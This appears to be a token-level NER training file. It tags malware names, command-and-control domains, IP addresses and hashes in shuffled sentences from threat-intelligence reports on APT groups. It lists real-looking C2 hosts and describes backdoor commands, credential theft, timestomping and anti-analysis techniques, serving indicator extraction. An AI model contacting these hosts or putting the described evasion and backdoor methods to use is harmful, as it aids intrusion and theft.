executed	O
,	O
the	O
code	O
delivers	O
Remote	O
Access	O
Tools	O
(	O
RATs	B-malware.backdoor
)	O
and	O
evades	O
detection	O
using	O
a	O
range	O
of	O
techniques	O
.	O

Both	O
groups	O
have	O
historically	O
targeted	O
government	O
organizations	O
,	O
think	O
tanks	O
,	O
universities	O
,	O
and	O
corporations	O
around	O
the	O
world	O
.	O

Command	O
&	O
control	O
(	O
C	O
&	O
C	O
)	O
:	O
Using	O
a	O
simple	O
XOR	O
loop	O
for	O
encryption	O
,	O
the	O
malware	O
attempts	O
to	O
connect	O
to	O
laoding521.eicp.net	B-url.cncsvr
over	O
port	O
889	O
to	O
communicate	O
with	O
the	O
attackers	O
.	O

In	O
addition	O
to	O
this	O
,	O
both	O
groups	O
have	O
been	O
seen	O
using	O
a	O
similar	O
infection	O
vector	O
,	O
namely	O
an	O
Excel	O
document	O
which	O
drops	O
a	O
malicious	O
VBS	O
 le	O
.	O

SPEAR	O
has	O
observed	O
numerous	O
different	O
XOR	O
keys	O
utilized	O
by	O
the	O
group	O
.	O

Fake	O
'	O
Microsoft	O
Security	O
Essentials	O
Quick	O
Scan	O
'	O
Epic	B-malware.backdoor
backdoor	O
installer	O

Passive	O
Total	O
tells	O
us	O
that	O
50.63.202.94	B-ip.unknown
has	O
hosted	O
4535	O
unique	O
domains	O
since	O
2012	O
,	O
while	O
64.202.189.10	B-ip.unknown
has	O
hosted	O
4213	O
unique	O
domains	O
since	O
2009	O
.	O

The	O
C2	O
domain	O
(	O
khanji[.]ddns[.]net	B-url.cncsvr
)	O
was	O
also	O
found	O
to	O
be	O
associated	O
with	O
multiple	O
malware	O
samples	O
in	O
the	O
past	O
,	O
Some	O
of	O
these	O
malware	O
samples	O
made	O
connection	O
to	O
pastebin	O
urls	O
upon	O
execution	O
,	O
which	O
is	O
similar	O
to	O
the	O
behavior	O
mentioned	O
previously	O
.	O

based	O
packet	O
with	O
the	O
set	O
to	O
0x0C	O
.	O

This	O
prevents	O
its	O
discovery	O
from	O
search	O
engine	O
indexing	O
,	O
vulnerability	O
scanning	O
tools	O
and	O
other	O
unauthorized	O
access	O
to	O
the	O
backdoor	O
.	O

These	O
features	O
ensure	O
complete	O
remote	O
control	O
of	O
the	O
computer	O
.	O

The	O
IP	O
addresses	O
hosting	O
the	O
C	O
&	O
C	O
services	O
are	O
scattered	O
all	O
over	O
the	O
world	O
and	O
are	O
believed	O
to	O
be	O
compromised	O
hosts	O
.	O

Trend	O
Micro	O
OfficeScanTM	O
with	O
XGenTM	O
endpoint	O
security	O
infuses	O
high-fidelity	O
machine	O
learning	O
with	O
other	O
detection	O
technologies	O
and	O
global	O
threat	O
intelligence	O
for	O
comprehensive	O
protection	O
against	O
all	O
kinds	O
of	O
threats	O
.	O

The	O
document	O
contains	O
an	O
obfuscated	O
Visual	O
Basic	O
macro	O
:	O
Visual	O
Basic	O
macro	O
.	O

getOsInfo	O
getProcessList	O
executeShellCommand	O
getInstalledApps	O
checkBackupIosDeviceFolder	O
downloadFileFromPath	O
createFileInSystem	O
executeFile	O
deleteFile	O
takeScreenShot	O
Start	O
screenShotLoop	O
Stop	O
screenShotLoop	O
getFirefoxPassword	O
uploadFile	O
:	O
urlServer	O
:	O
userName	O
:	O
password	O
:	O
stopOperation	O
readFiles	O
2	O
.	O

We	O
identified	O
a	O
number	O
of	O
servers	O
Lazarus	O
used	O
as	O
a	O
backend	O
system	O
for	O
temporarily	O
holding	O
stolen	O
data	O
.	O

In	O
some	O
cases	O
this	O
was	O
achieved	O
through	O
a	O
simple	O
XOR	O
obfuscation	O
of	O
the	O
packet	O
data	O
,	O
beginning	O
with	O
the	O
zlib	O
header	O
.	O

Three	O
customized	O
credential	O
dumping	O
tools	O
,	O
which	O
are	O
inspired	O
by	O
known	O
tools	O
.	O

A	O
price	O
list	O
found	O
on	O
a	O
different	O
website	O
,	O
also	O
posted	O
in	O
December	O
2014	O
,	O
lists	O
the	O
binary	O
's	O
price	O
as	O
$	O
270	O
and	O
some	O
additional	O
modules	O
,	O
such	O
as	O
a	O
'	O
Edit	O
Hosts	O
module	O
'	O
(	O
$	O
15	O
)	O
,	O
a	O
'	O
Botkill	O
module	O
'	O
(	O
$	O
30	O
)	O
and	O
a	O
'	O
Bitcoin	O
monitor	O
module	O
'	O
(	O
$	O
20	O
)	O
.	O

If	O
the	O
system	O
restarts	O
before	O
the	O
malware	O
has	O
completed	O
wiping	O
the	O
disk	O
then	O
much	O
of	O
the	O
data	O
can	O
still	O
be	O
recovered	O
:	O
each	O
of	O
our	O
tests	O
showed	O
the	O
system	O
did	O
restart	O
before	O
the	O
disk	O
was	O
completely	O
wiped	O
.	O

This	O
specific	O
downloader	O
,	O
Cmstar	B-malware.unknown
,	O
is	O
associated	O
with	O
the	O
Lurid	B-malware.unknown
downloader	O
also	O
known	O
as	O
'	O
Enfal	O
'	O
.	O

When	O
opened	O
the	O
flash	O
video	O
simply	O
displays	O
a	O
couple	O
kissing	O
passionately	O
.	O

When	O
the	O
dropper	O
installs	O
the	O
backdoor	O
,	O
it	O
sets	O
its	O
attributes	O
to	O
'	O
hidden	O
'	O
and	O
sets	O
file	O
date	O
and	O
time	O
to	O
random	O
values	O
using	O
the	O
touch	O
command	O
:	O
touch	O
–t	O
YYMMDDMM	O
'	O
/path/filename	O
'	O
>	O
/dev/null	O
.	O

The	O
malware	O
uses	O
these	O
techniques	O
to	O
avoid	O
detection	O
and	O
resist	O
analysis	O
,	O
and	O
developing	O
these	O
anti-sandbox	O
techniques	O
indicates	O
that	O
the	O
author	O
wanted	O
the	O
code	O
to	O
resist	O
casual	O
analysis	O
attempts	O
.	O

01	O
B4	O
EE	O
00	O
AE	O
DA	O
00	O
8C	O
16	O
00	O
89	O
22	O
00	O
46	O
73	O
00	O
C6	O
49	O
00	O
0B	O
AE	O
01	O
E7	O
9F	O
04	O
05	O
81	O
01	O
0E	O
DF	O
01	O
79	O
D8	O
00	O
25	O
6A	O
00	O
15	O
49	O
00	O
47	O
22	O
00	O
4B	O
67	O
0F	O
2D	O
CC	O
01	O
29	O
67	O
01	O
35	O
99	O

31.03.2015	O
:	O
IoT	O
:	O
The	O
Internet	O
of	O
Things	O
...	O
ehm	O
...	O
Trouble	O
?	O

29	O
Dec	O
.	O

The	O
victims	O
we	O
are	O
at	O
liberty	O
to	O
identify	O
include	O
Alexander	O
Petrushov	O
and	O
Irina	O
Petroshova	O
,	O
publishers	O
of	O
the	O
independent	O
Kazakh	O
newspaper	O
,	O
Respublika	O

Malicious	O
Domain	O
/	O
IP	O
:	O
193.169.245(.)137	B-url.unknown

In	O
this	O
particular	O
sample	O
an	O
interesting	O
and	O
notable	O
string	O
was	O
observed	O
:	O
C	O
:	O
\wocawocawoca\piao\Release\caca.pdb	O
Also	O
of	O
interest	O
is	O
that	O
as	O
observed	O
from	O
the	O
Java	O
Applet	O
,	O
the	O
executable	O
is	O
also	O
digitally	O
signed	O
by	O
a	O
certificate	O
issued	O
to	O
â	O
œWindySoft.â	O
€	O
Upon	O
execution	O
the	O
malware	O
sample	O
immediately	O
does	O
a	O
DNS	O
resolution	O
for	O
the	O
following	O
hostname	O
:	O

These	O
are	O
,	O
however	O
,	O
all	O
dummy	O
exports	O
to	O
throw	O
off	O
analysts	O
or	O
perhaps	O
even	O
taunt	O
researchers	O
,	O
and	O
more	O
specifically	O
perhaps	O
to	O
taunt	O
the	O
Japan	O
Computer	O
Emergency	O
Response	O
Team	O
Coordination	O
Center	O
(	O
JPCERT/CC	O
)	O
.	O

dragon	O
'	O
.	O

We	O
are	O
concerned	O
that	O
while	O
the	O
malware	O
system	O
was	O
probably	O
developed	O
for	O
a	O
specific	O
target	O
or	O
family	O
of	O
targets	O
,	O
it	O
could	O
be	O
employed	O
with	O
little	O
adaptation	O
against	O
virtually	O
any	O
target	O
.	O

https://developer.android.com/guide/components/services.html	B-url.normal

[	O
그림	O
9	O
]	O
관리	O
소프트웨어	O
C	O
공격	O
도구	O
안다리엘	O
그룹은	O
다양한	O
공급망을	O
이용한	O
공격을	O
시도했다	O
.	O

Relying	O
on	O
automatic	O
memory	O
dumping	O
will	O
not	O
work	O
since	O
the	O
MZ/PE	O
headers	O
are	O
broken	O
.	O

In	O
addition	O
,	O
the	O
file	O
has	O
the	O
capability	O
of	O
downloading	O
and	O
running	O
another	O
executable	O
After	O
reviewing	O
all	O
the	O
malware	O
functionalities	O
,	O
we	O
are	O
confident	O
in	O
saying	O
that	O
the	O
attackers	O
look	O
for	O
victims	O
who	O
answer	O
well-defined	O
characteristics	O
and	O
believe	O
that	O
further	O
stages	O
of	O
the	O
attack	O
are	O
delivered	O
only	O
to	O
those	O
who	O
fit	O
the	O
specific	O
victim	O
profile	O
.	O

Hash	O

However	O
,	O
they	O
do	O
roughly	O
represent	O
the	O
scope	O
of	O
the	O
campaign	O
:	O
tens	O
to	O
few	O
hundreds	O
of	O
recipients	O
-	O
mostly	O
in	O
Israel	O
,	O
the	O
United	O
States	O
and	O
the	O
Palestinian	O
Territories	O
.	O

To	O
be	O
perfectly	O
clear	O
,	O
we	O
are	O
not	O
saying	O
that	O
it	O
took	O
security	O
vendors	O
months	O
or	O
years	O
to	O
detect	O
a	O
threat	O
.	O

FOOTNOTES	O

Unit	O
42	O
found	O
that	O
the	O
string	O
'	O
avp	O
'	O
subjected	O
to	O
the	O
algorithm	O
above	O
results	O
in	O
the	O
value	O
0x1E00AFA	B-hash
,	O
which	O
suggests	O
the	O
Cmstar	B-malware.unknown
sample	O
specifically	O
looks	O
for	O
Kaspersky	O
's	O
Anti-virus	O
product	O
(	O
avp.exe	O
)	O
running	O
on	O
the	O
compromised	O
system	O
.	O

TRITON	B-malware.infosteal
implements	O
the	O
TriStation	O
protocol	O
,	O
which	O
is	O
the	O
protocol	O
used	O
by	O
the	O
legitimate	O
TriStation	O
application	O
,	O
to	O
configure	O
controllers	O
.	O

This	O
backdoor	O
has	O
not	O
been	O
publicly	O
documented	O
and	O
is	O
one	O
of	O
the	O
most	O
unique	O
TTPs	O
with	O
regards	O
to	O
the	O
threat	O
actor	O
.	O

963BFAE19B3DA5BECE081DFF1D1E3EF9	B-hash
hint.zapto.org	B-url.cncsvr

안다리엘	O
그룹	O
(	O
Andariel	O
Group	O
)	O
은	O
라자루스	O
(	O
Lazarus	O
)	O
공격	O
그룹의	O
하위	O
그룹으로	O
,	O
지난	O
2015년부터	O
활동이	O
확인되었다	O
.	O

Additionally	O
malware	O
reports	O
itself	O
to	O
its	O
hardcoded	O
command	O
and	O
control	O
servers	O
and	O
established	O
a	O
backdoor	O
connection	O
,	O
so	O
the	O
attacker	O
may	O
have	O
a	O
permanent	O
remote	O
connection	O
.	O

Through	O
the	O
hook	O
mechanism	O
Babar	B-malware.drop
can	O
be	O
maximum	O
invasive	O
in	O
the	O
Windows	O
userland	O
.	O

1c8a1aa75d514d9b1c7118458e0b8a14	B-hash

Modules	O

Figure	O
1	O
consists	O
of	O
various	O
derivation	O
relationships	O
and	O
major	O
module	O
functionalities	O
:	O

XtremeRat	B-malware.backdoor
install	O
settings	O
By	O
default	O
,	O
the	O
controller	O
assigns	O
a	O
process	O
mutex	O
name	O
of	O
is	O
'	O
–	O
(	O
(	O
Mutex	O
)	O
)	O
–	O
'	O
and	O
the	O
attackers	O
changed	O
it	O
to	O
'	O
fdgdfdg	O
'	O
.	O

https://www.virustotal.com/en/file/f96f07288039ebabb8d837043f06f8f1445ed4484023353e1111a40ac4f25fd8/analysis/	B-url.normal

The	O
malware	O
employs	O
a	O
number	O
of	O
techniques	O
for	O
obfuscation	O
,	O
such	O
as	O
stack	O
construction	O
of	O
variables	O
and	O
data	O
,	O
various	O
XOR	O
encodings	O
and	O
data	O
reordering	O
schemes	O
,	O
and	O
some	O
anti-analysis	O
techniques	O
.	O

Works	O
with	O
Internet	O
Explorer	O
,	O
Chrome	O
,	O
Opera	O
,	O
Firefox	O
,	O
Torch	O
,	O
and	O
Yandex	O
.	O

CROWDSTRIKE	O
INTELLIGENCE	O
ASSESSES	O
A	O
TOOL	O
SUCH	O
AS	O
THIS	O
HAS	O
THE	O
POTENTIAL	O
ABILITY	O
TO	O
MAP	O
OUT	O
A	O
UNIT	O
'S	O
COMPOSITION	O
AND	O
HIERARCHY	O
,	O
DETERMINE	O
THEIR	O
PLANS	O
,	O
AND	O
EVEN	O
TRIANGULATE	O
THEIR	O
APPROXIMATE	O
LOCATION	O

Additionally	O
,	O
the	O
samples	O
uploaded	O
from	O
Poland	O
and	O
Uruguay	O
match	O
with	O
the	O
watering-hole	O
activity	O
observed	O
–	O
suggesting	O
this	O
is	O
all	O
part	O
of	O
the	O
same	O
campaign	O
.	O

On	O
8	O
Jan	O
2014	O
,	O
The	O
Fidelis	O
Network	O
Defense	O
and	O
Forensics	O
team	O
received	O
three	O
files	O
:	O
netsat.exe	B-malware.infosteal
,	O
netui3.dll	B-malware.backdoor
and	O
winmgt.dll	B-malware.backdoor
.	O

Regarding	O
Dino	B-malware.backdoor
's	O
victims	O
,	O
we	O
know	O
very	O
little	O
except	O
that	O
they	O
were	O
located	O
in	O
Iran	O
in	O
2013	O
.	O

10	O
août	O
2015	O
Darkhotel	B-malware.infosteal
APT	I-malware.infosteal
attacks	O
dated	O
2014	O
and	O
earlier	O
are	O
characterized	O
by	O
the	O
misuse	O
of	O
stolen	O
certificates	O
,	O
the	O
deployment	O
of	O
.hta	O
files	O
with	O
multiple	O
techniques	O
,	O
and	O
the	O
use	O
of	O
unusual	O
methods	O
like	O
the	O
infiltration	O
of	O
hotel	O
Wi-Fi	O
to	O
place	O
backdoors	O
in	O
targets	O
'	O
systems	O
.	O

Here	O
we	O
can	O
see	O
both	O
of	O
them	O
use	O
Cookie	O
to	O
transmit	O
information	O
that	O
has	O
been	O
encrypted	O
,	O
and	O
send	O
requests	O
actively	O
every	O
60	O
seconds	O
.	O

The	O
toolset	B-malware.infosteal
first	O
gained	O
notoriety	O
after	O
it	O
was	O
revealed	O
that	O
the	O
Egyptian	O
Government	O
's	O
state	O
security	O
apparatus	O
had	O
been	O
involved	O
in	O
negotiations	O
with	O
Gamma	O
International	O
UK	O
Ltd	O
.	O

Figure	O
2	O
:	O
Standard	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
3.6	O
packet	O
response	O
|	O
Controller	O
to	O
victim	O
–	O
22	O
bytes	O

108.171.124.13	B-ip.unknown
is	O
pointed	O
to	O
by	O
helpme.no-ip.biz	B-url.cncsvr
,	O
mjed10.no-ip.info	B-url.cncsvr

$	O
SEX	O
–	O
If	O
this	O
appears	O
in	O
unlabeled	O
textbox1	O
,	O
pass	O
the	O
contents	O
to	O
the	O
Server.Execute	O
(	O
)	O
method	O
.	O

*	O
This	O
data	O
is	O
subject	O
to	O
change	O
.	O

Intelligence	O
Report	O
Israel	O
ג	O
€TMs	O
strategic	O
position	O
has	O
improved.exe	O
Updata.lnk	O

Attackers	O
do	O
read	O
reports	O
,	O
both	O
to	O
help	O
them	O
attack	O
and	O
also	O
to	O
evade	O
detection	O
.	O

워터링홀	O
(	O
ActiveX	B-malware.drop
취약점	O
)	O
......................................................................................................................................	O
6	O
3	O
.	O

Similar	O
to	O
RIPTIDE	B-malware.backdoor
and	O
HIGHTIDE	B-malware.backdoor
,	O
the	O
WATERSPOUT	B-malware.backdoor
backdoor	O
is	O
an	O
HTTP-based	O
backdoor	O
that	O
communicates	O
with	O
its	O
C2	O
server	O
.	O

The	O
second	O
function	O
decompresses	O
this	O
'	O
temporary.zip	O
'	O
file	O
and	O
extracts	O
the	O
.exe	O
file	O
stored	O
in	O
it	O
.	O

Further	O
,	O
the	O
attacker	O
may	O
selectively	O
serve	O
the	O
next	O
stage	O
based	O
upon	O
the	O
requesting	O
IP	O
address	O
or	O
HTTP	O
headers	O
(	O
indicating	O
a	O
specific	O
targeted	O
environment	O
)	O
.	O

Since	O
this	O
malware	O
dates	O
back	O
to	O
around	O
2004	O
,	O
there	O
are	O
many	O
samples	O
containing	O
CNC	O
URLs	O
from	O
the	O
3322.org	O
page	O
.	O

The	O
threat	O
actors	O
associated	O
with	O
DRAGONFISH	O
have	O
previously	O
focused	O
their	O
campaigns	O
on	O
targets	O
in	O
Southeast	O
Asia	O
,	O
specifically	O
those	O
located	O
in	O
countries	O
near	O
the	O
South	O
China	O
Sea	O
.	O

While	O
the	O
general	O
form	O
within	O
the	O
Derusbi	B-malware.backdoor
server	O
variant	O
communication	O
model	O
is	O
to	O
return	O
a	O
packet	O
with	O
the	O
same	O
as	O
the	O
original	O
command	O
,	O
many	O
of	O
the	O
commands	O
return	O
a	O
status	O
packet	O
type	O
(	O
=	O
0x04	O
)	O
.	O

rndismpc.sys	O
uses	O
a	O
registry	O
key	O
that	O
is	O
different	O
from	O
the	O
keys	O
used	O
by	O
both	O
mrxcls	O
and	O
rtniczw	O
-	O
it	O
is	O
the	O
key	O
'	O
rndismpc	O
'	O
with	O
the	O
value	O
'	O
Action	O
'	O
;	O
2.	O
it	O
uses	O
an	O
encryption	O
key	O
that	O
is	O
different	O
from	O
that	O
used	O
by	O
mrxcls/rtniczw	O
-	O
0x89CF98B1	O
;	O
3.	O
the	O
file	O
's	O
compilation	O
date	O
is	O
20	O
January	O
2008	O
,	O
i.e.	O
a	O
year	O
before	O
mrxcls/rtniczw	O
were	O
created	O
.	O

All	O
but	O
one	O
of	O
these	O
Python-based	O
droppers	O
first	O
checks	O
for	O
execution	O
in	O
a	O
VMware	O
or	O
Cuckoo	O
Sandbox	O
environment	O
.	O

Reported	O
as	O
a	O
major	O
cyber	O
attack	O
,	O
our	O
analysis	O
of	O
the	O
malware	O
and	O
attack	O
vectors	O
employed	O
suggests	O
that	O
the	O
malware	O
had	O
a	O
relatively	O
low	O
level	O
of	O
technical	O
sophistication	O
.	O

infected	O
system	O
and	O
to	O
re-execute	O
The	O
malware	O
is	O
located	O
in	O
the	O
'	O
<	O
UserHomedir	O
>	O
/Library/Assistants/.local/	O
'	O
path	O
in	O
a	O
random	O
directory	O
with	O
a	O
name	O
picked	O
from	O
a	O
hardcoded	O
list	O
.	O

If	O
neither	O
check	O
passes	O
,	O
the	O
code	O
returns	O
false	O
and	O
the	O
code	O
will	O
finally	O
check	O
for	O
the	O
presence	O
of	O
a	O
cookie	O
named	O
<	O
REDACTED	O
>	O
.	O

Because	O
of	O
the	O
noted	O
indications	O
that	O
IRONGATE	B-malware.backdoor
is	O
a	O
proof	O
of	O
concept	O
,	O
we	O
can	O
not	O
conclude	O
IRONGATE	B-malware.backdoor
's	O
author	O
intends	O
to	O
manipulate	O
specific	O
temperature	O
or	O
pressure	O
values	O
associated	O
with	O
the	O
specific	O
biogas.exe	O
process	O
,	O
but	O
find	O
the	O
similarities	O
to	O
this	O
example	O
code	O
striking	O
.	O

TRITON	B-malware.infosteal
was	O
used	O
to	O
modify	O
application	O
memory	O
on	O
SIS	O
controllers	O
in	O
the	O
environment	O
,	O
which	O
could	O
have	O
led	O
to	O
a	O
failed	O
validation	O
check	O
.	O

Contact	O
Us	O
Communication	O
Preferences	O
Report	O
Security	O
Issue	O
Supplier	O
Documents	O
Legal	O
Documentation	O
Twitter	O
Google+	O
YouTube	O
Podcast	O
LinkedIn	O
Facebook	O

The	O
malware	O
used	O
for	O
this	O
is	O
very	O
simple	O
,	O
but	O
uses	O
a	O
little	O
used	O
format	O
.	O

The	O
only	O
observed	O
persistence	O
method	O
to	O
date	O
is	O
the	O
use	O
of	O
the	O
standard	O
Windows	O
Run	O
key	O
'	O
SOFTWARE\Microsoft\Windows\CurrentVersion\Run	O
'	O
under	O
either	O
a	O
user	O
's	O
hive	O
or	O
HKLM	O
.	O

The	O
information	O
is	O
passed	O
along	O
in	O
a	O
POST	O
request	O
made	O
by	O
another	O
batch	O
script	O
fi	O
le	O
that	O
is	O
decrypted	O
and	O
dropped	O
by	O
win32	O
.	O

NATO	O
Armed	O
men	O
appear	O
in	O
unmarked	O
uniforms	O
in	O
Crimea	O
CyberBerkut	O
Emerges	O

The	O
following	O
Table	O
lists	O
the	O
commands	O
accepted	O
by	O
this	O
Dino	B-malware.backdoor
binary	O
with	O
the	O
names	O
chosen	O
by	O
the	O
developers	O
.	O

The	O
dll	O
creates	O
an	O
additional	O
service	O
on	O
the	O
victim	O
's	O
computer	O
and	O
checks	O
for	O
certain	O
files	O
on	O
the	O
system	O
.	O

However	O
,	O
in	O
addition	O
to	O
new	O
variants	O
of	O
malicious	O
.hta	O
,	O
we	O
find	O
new	O
victims	O
,	O
.rar	O
attachments	O
with	O
RTLO	O
spearphishing	O
,	O
and	O
the	O
deployment	O
of	O
a	O
0day	O
from	O
Hacking	O
Team	O
.	O

The	O
embedded	O
anti-analysis	O
techniques	O
and	O
other	O
capabilities	O
introduce	O
tradecraft	O
that	O
is	O
integrated	O
directly	O
into	O
the	O
malware	O
's	O
layers	O
.	O

Enhanced	O
Cybersecurity	O
Services	O
(	O
ECS	O
)	O
helps	O
critical	O
infrastructure	O
owners	O
and	O
operators	O
protect	O
their	O
systems	O
by	O
sharing	O
sensitive	O
and	O
classified	O
cyber	O
threat	O
information	O
with	O
Commercial	O
Service	O
Providers	O
(	O
CSPs	O
)	O
and	O
Operational	O
Implementers	O
(	O
OIs	O
)	O
.	O

As	O
shown	O
in	O
Figure	O
26	O
,	O
a	O
quick	O

This	O
tool	O
will	O
be	O
abused	O
using	O
the	O
DLL	O
side	O
loading	O
technique	O
.	O

update.exe	O
CTF	O
2011	O
(	O
MF	O
)	O
.xls	O
BBC	O
Monitoring	O
reports..xls	O
Five	O
Simple	O
Questions	O
for	O
Democrats	O
on	O
Spending	O
Cuts.doc	O
Behind	O
the	O
Easing	O
of	O
Israeli-Palestinian	O
Tensions.doc	O
Business	O
Exec	O
Urges	O
Broad	O
Trade	O
AgendaTo	O
Curb	O
China	O
Role	O
In	O
Latin	O
America.doc	O
PatriotLMSR2009Fin	O
.doc	O
agenda201005.pdf	O
Protests	O
Spread	O
in	O
Syria.pdf	O
Cybersecurity	O
and	O
Cyber	O
War.pdf	O
The	O
Meeting	O
intivation	O
of	O
International	O
Atomic	O
Energy	O
Agency	O
06-05-2011.scr	O
New	O
SOPs	O
for	O
HEC	O
Coord	O
with	O
NATO.pdf	O
Human	O
right	O
report	O
of	O
noth	O
Afica	O
under	O
the	O
war.scr	O
Middle_East_Civil_Unrest.pdf	O
meeting	O
invitation	O
of	O
British	O
Council	O
2011.scr	O
Meeting	O
information	O
details	O
of	O
[	O
REMOVED	O
]	O
.exe	O
Meeting	O
information	O
details	O
of	O
[	O
REMOVED	O
]	O
.exe	O
Meeting	O
detail	O
information	O
from	O
[	O
REMOVED	O
]	O
.scr	O
Meeting	O
detail	O
information	O
from	O
[	O
REMOVED	O
]	O
.scr	O
weekly_security_report-06-20-2011__-__06-26-2011.pdf	O
How	O
to	O
Get	O
Free	O
Airline	O
Tickets.pdf	O
2011.xls	O
Obituary.xls	O
Updated_roster.xls	O
2011	O
project	O
budget.xls	O
Participant_Contacts.xls	O
Current	O
international	O
situation	O
surrounding	O
Syria.doc	O
Update	O
of	O
Health	O
&	O
Medical	O
force.xls	O
FY12	O
Government	O
Opportunities.pdf	O
China	O
's	O
Jasmine	O
protests.pdf	O
Yemen	O
para	O
for	O
SC	O
briefing.doc	O
DECLARATION-	O
COMMENTS.Netherlands.pdf	O
REPLY_	O
FORM.doc	O
Global	O
A	O
&	O
D	O
outlook	O
2012.pdf	O
Global_A&D_outlook_2012.pdf	O
Mandiant	O
Indicators	O
of	O
Compromise	O
http://intelreport.mandiant.com/Mandiant_APT1_Report_Appendix.zip	O

We	O
see	O
traces	O
of	O
upwards	O
of	O
a	O
few	O
tens	O
of	O
companies	O
targeted	O
.	O

(	O
//TWITTER.COM/INTENT/TWEET?TEXT=IRAN-BASED	B-url.normal
%	I-url.normal
20CHAFER	I-url.normal
%	I-url.normal
20ATTACK	I-url.normal
%	I-url.normal
20GROUP	I-url.normal
%	I-url.normal
20MOUNTED	I-url.normal
%	I-url.normal
20FURTHER	I-url.normal
%	I-url.normal
20OPERATIONS	I-url.normal
%	I-url.normal
20AGAINST	I-url.normal
%	I-url.normal
20MORE	I-url.normal
%	I-url.normal
20ORGANIZATIONS	I-url.normal
%	I-url.normal
20IN%20T	I-url.normal

page	O
|	O
1	O

The	O
malicious	O
code	O
connects	O
to	O
the	O
domain	O
voguextra[.]com	B-url.unknown
.	O

Dedicated	O
APIs	O
are	O
loaded	O
through	O
a	O
resolution	O
function	O
,	O
which	O
searches	O
for	O
library	O
exports	O
by	O
comparing	O
hashes	O
of	O
the	O
export	O
names	O
with	O
a	O
given	O
hash	O
.	O

Within	O
the	O
large	O
volumes	O
of	O
samples	O
submitted	O
daily	O
to	O
these	O
services	O
,	O
some	O
submissions	O
appear	O
to	O
be	O
different	O
from	O
others	O
and	O
show	O
interesting	O
characteristics	O
.	O

The	O
compromised	O
versions	O
of	O
the	O
Telegram	O
and	O
WhatsApp	O
applications	O
used	O
in	O
this	O
campaign	O
are	O
more	O
interesting	O
and	O
relevant	O
.	O

특정	O
IP주소	O
(	O
IP	O
Address	O
)	O
에서	O
접속할	O
경우에만	O
,	O
즉	O
공격자가	O
원하는	O
특정	O
대상만	O
악성코	O
드에	O
감염되도록	O
함으로써	O
공격	O
대상의	O
발견을	O
어렵게	O
하는	O
사례도	O
있다	O
.	O

Injection	O
is	O
achieved	O
the	O
same	O
way	O
as	O
the	O
infection	O
of	O
child	O
instances	O
described	O
in	O
section	O
3.4	O
.	O

By	O
now	O
,	O
the	O
authors	O
of	O
CozyDuke	B-malware.drop
had	O
switched	O
from	O

When	O
the	O
victim	O
opens	O
the	O
attached	O
excel	O
file	O
it	O
drops	O
the	O
malware	O
and	O
displays	O
a	O
decoy	O
excel	O
sheet	O
containing	O
the	O
list	O
of	O
names	O
,	O
which	O
seems	O
be	O
the	O
names	O
of	O
senior	O
army	O
officers	O
.	O

Conclusion	O

Attacks	O
against	O
electoral	O
candidates	O
and	O
the	O
parties	O
they	O
represent	O
are	O
likely	O
to	O
continue	O
up	O
until	O
the	O
election	O
in	O
November	O
.	O

The	O
most	O
important	O
evidence	O
emerged	O
from	O
the	O
analysis	O
of	O
the	O
sdbn.dll	O
is	O
that	O
it	O
contacted	O
the	O
domain	O
:	O
'	O
marina-info.net	B-url.unknown
,	O
'	O
a	O
clear	O
reference	O
to	O
the	O
Italian	O
Marina	O
Militare	O
.	O

This	O
complaint	O
,	O
as	O
laid	O
out	O
by	O
Privacy	O
International	O
states	O
that	O
Gamma	O
:	O
failed	O
to	O
respect	O
the	O
internationally	O
recognised	O
human	O
rights	O
of	O
those	O
affected	O
by	O
[	O
its	O
]	O
activities	O
caused	O
and	O
contributed	O
to	O
adverse	O
human	O
rights	O
impacts	O
in	O
the	O
course	O
of	O
[	O
its	O
]	O
business	O
activities	O
failed	O
to	O
prevent	O
and	O
mitigate	O
adverse	O
human	O
rights	O
impacts	O
linked	O
to	O
[	O
its	O
]	O
activities	O
and	O
products	O
,	O
and	O
failed	O
to	O
address	O
such	O
impacts	O
where	O
they	O
have	O
occurred	O
failed	O
to	O
carry	O
out	O
adequate	O
due	O
diligence	O
(	O
including	O
human	O
rights	O
due	O
diligence	O
)	O
;	O
and	O
failed	O
to	O
implement	O
a	O
policy	O
commitment	O
to	O
respect	O
human	O
rights	O
.	O

Table	O
4	O
:	O
Metadata	O
of	O
'	O
system_web.aspx	B-malware.backdoor
'	O
System_web.aspx	B-malware.backdoor
is	O
an	O
excellent	O
example	O
of	O
a	O
more	O
robust	O
web	O
shell	O
used	O
to	O
replace	O
Deep	O
Panda	O
's	O
traditional	O
beaconing	O
command	O
and	O
control	O
infrastructure	O
.	O

CONCLUSION	O
.......................................................................................................................................................	O
11	O
APPENDIX	O
1	O
REFERENCES	O
OF	O
COBALT	O
STRIKE	O
AND	O
THE	O
AUTHOR	O
.................................................................................	O
12	O
APPENDIX	O
2	O
ABOUT	O
ANTIY	O
..........................................................................................................................................	O
16	O

Reported	O
Russian	O
Military	O
and	O
Civilian	O
Intelligence	O
Services	O
(	O
RIS	O
)	O
Indicators	O
of	O
Compromise	O
(	O
IOCs	O
)	O

Other	O
Large	O
scale	O
APTs	O
using	O
Cobalt	O
Strike	O
have	O
been	O
reported	O
before	O
,	O
such	O
as	O
APT-TOCS	O
(	O
could	O
be	O
related	O
to	O
OceanLotus	O
)	O
,	O
Ordinaff	B-malware.backdoor
,	O
Carbanak	O
Group	O
,	O
and	O
the	O
Cobalt	O
Group	O
.	O

According	O
to	O
the	O
videos	O
he	O
watched	O
it	O
seems	O
that	O
he	O
was	O
learning	O
development	O
and	O
hacking	O
skills	O
over	O
the	O
past	O
few	O
years	O
:	O
Similarly	O
,	O
we	O
found	O
his	O
Twitter	O
account	O
(	O
also	O
disabled	O
)	O
full	O
name	O
Moayyad	O
Ayesh	O
and	O
Facebook	O
account	O

Figure	O
1	O
:	O
Scada.exe	B-malware.unknown
Unique	O
Strings	O
Figure	O
2	O
:	O
Step7ProSim.dll	O
Unique	O
Strings	O
Table	B-hash
3	I-hash
contains	O
the	O
MD5	O
hashes	O
,	O
file	O
and	O
architecture	O
type	O
,	O
and	O
compile	O
times	O
for	O
the	O
malware	O
analyzed	O
in	O
this	O
report	O
.	O

Indeed	O
,	O
some	O
hypervisors	O
(	O
VMWare	O
,	O
VirtualBox	O
and	O
Hyper-V	O
)	O
do	O
not	O
support	O
temperature	O
check	O
.	O

The	O
most	O
interesting	O
of	O
these	O
is	O
the	O
reported	O
Hacking	O
Team	O
Flash	O
0day	O
,	O
icon.swf	O
.	O

We	O
've	O
had	O
lots	O
of	O
experience	O
with	O
both	O
of	O
these	O
actors	O
attempting	O
to	O
target	O
our	O
customers	O
